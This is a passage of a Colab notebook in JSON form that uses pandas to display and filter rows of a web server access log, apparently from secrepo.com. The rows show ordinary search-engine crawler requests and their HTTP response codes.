              "      <th>2</th>\n",
              "      <td>22/Mar/2019:01:58:55 -0700</td>\n",
              "      <td>54.36.148.18</td>\n",
              "      <td>404</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>22/Mar/2019:02:04:26 -0700</td>\n",
              "      <td>54.36.148.62</td>\n",
              "      <td>404</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>22/Mar/2019:02:04:51 -0700</td>\n",
              "      <td>54.36.149.57</td>\n",
              "      <td>200</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                         date     client_ip http_response\n",
              "0  22/Mar/2019:01:55:15 -0700  101.89.29.92           200\n",
              "1  22/Mar/2019:01:57:37 -0700  54.36.148.43           200\n",
              "2  22/Mar/2019:01:58:55 -0700  54.36.148.18           404\n",
              "3  22/Mar/2019:02:04:26 -0700  54.36.148.62           404\n",
              "4  22/Mar/2019:02:04:51 -0700  54.36.149.57           200"
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    },
    {
      "metadata": {
        "id": "txNkx9UZZeSG",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Select a subset of rows"
      ]
    },
    {
      "metadata": {
        "id": "oe0mV4l4Znuy",
        "colab_type": "code",
        "outputId": "d7f37f5c-3879-4e9e-a050-fb7e0ef21039",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 289
        }
      },
      "cell_type": "code",
      "source": [
        "display(access_logs_df.iloc[10:15,])"
      ],
      "execution_count": 41,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>date</th>\n",
              "      <th>client_ip</th>\n",
              "      <th>request</th>\n",
              "      <th>http_response</th>\n",
              "      <th>bytes</th>\n",
              "      <th>something_else</th>\n",
              "      <th>user_agent</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>10</th>\n",
              "      <td>22/Mar/2019:02:13:49 -0700</td>\n",
              "      <td>54.36.149.5</td>\n",
              "      <td>GET /self.logs/access.log.2015-09-07.gz HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>284</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>11</th>\n",
              "      <td>22/Mar/2019:02:14:17 -0700</td>\n",
              "      <td>207.46.13.155</td>\n",
              "      <td>GET /self.logs/error.log.2017-01-27.gz HTTP/1.1</td>\n",
              "      <td>200</td>\n",
              "      <td>1708</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (compatible; bingbot/2.0; +http://...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>12</th>\n",
              "      <td>22/Mar/2019:02:21:56 -0700</td>\n",
              "      <td>109.201.152.248</td>\n",
              "      <td>HEAD / HTTP/1.1</td>\n",
              "      <td>301</td>\n",
              "      <td>209</td>\n",
              "      <td>https://uptime.com/secrepo.com</td>\n",
              "      <td>Mozilla/5.0 (compatible; Uptimebot/1.0; +http:...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>13</th>\n",
              "      <td>22/Mar/2019:02:25:52 -0700</td>\n",
              "      <td>207.46.13.104</td>\n",
              "      <td>GET / HTTP/1.1</td>\n",
              "      <td>200</td>\n",
              "      <td>12511</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (compatible; bingbot/2.0; +http://...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>14</th>\n",
              "      <td>22/Mar/2019:02:26:11 -0700</td>\n",
              "      <td>216.244.66.245</td>\n",
              "      <td>GET /robots.txt HTTP/1.1</td>\n",
              "      <td>200</td>\n",
              "      <td>233</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (compatible; DotBot/1.1; http://ww...</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                          date        client_ip  \\\n",
              "10  22/Mar/2019:02:13:49 -0700      54.36.149.5   \n",
              "11  22/Mar/2019:02:14:17 -0700    207.46.13.155   \n",
              "12  22/Mar/2019:02:21:56 -0700  109.201.152.248   \n",
              "13  22/Mar/2019:02:25:52 -0700    207.46.13.104   \n",
              "14  22/Mar/2019:02:26:11 -0700   216.244.66.245   \n",
              "\n",
              "                                             request http_response  bytes  \\\n",
              "10  GET /self.logs/access.log.2015-09-07.gz HTTP/1.1           404    284   \n",
              "11   GET /self.logs/error.log.2017-01-27.gz HTTP/1.1           200   1708   \n",
              "12                                   HEAD / HTTP/1.1           301    209   \n",
              "13                                    GET / HTTP/1.1           200  12511   \n",
              "14                          GET /robots.txt HTTP/1.1           200    233   \n",
              "\n",
              "                    something_else  \\\n",
              "10                               -   \n",
              "11                               -   \n",
              "12  https://uptime.com/secrepo.com   \n",
              "13                               -   \n",
              "14                               -   \n",
              "\n",
              "                                           user_agent  \n",
              "10  Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...  \n",
              "11  Mozilla/5.0 (compatible; bingbot/2.0; +http://...  \n",
              "12  Mozilla/5.0 (compatible; Uptimebot/1.0; +http:...  \n",
              "13  Mozilla/5.0 (compatible; bingbot/2.0; +http://...  \n",
              "14  Mozilla/5.0 (compatible; DotBot/1.1; http://ww...  "
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    },
    {
      "metadata": {
        "id": "S3FEAuBVOiIu",
        "colab_type": "code",
        "outputId": "5c0c3f90-9819-47a9-e27b-8c3a82bafe31",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 49
        }
      },
      "cell_type": "code",
      "source": [
        "#101.89.29.92\n",
        "access_logs_df.loc[access_logs_df['client_ip'] == '127.0.0.1',]"
      ],
      "execution_count": 42,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>date</th>\n",
              "      <th>client_ip</th>\n",
              "      <th>request</th>\n",
              "      <th>http_response</th>\n",
              "      <th>bytes</th>\n",
              "      <th>something_else</th>\n",
              "      <th>user_agent</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "Empty DataFrame\n",
              "Columns: [date, client_ip, request, http_response, bytes, something_else, user_agent]\n",
              "Index: []"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 42
        }
      ]
    },
    {
      "metadata": {
        "id": "6IMQrzB_aped",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        ""
      ],
      "execution_count": 0,
      "outputs": []
    }
  ]
}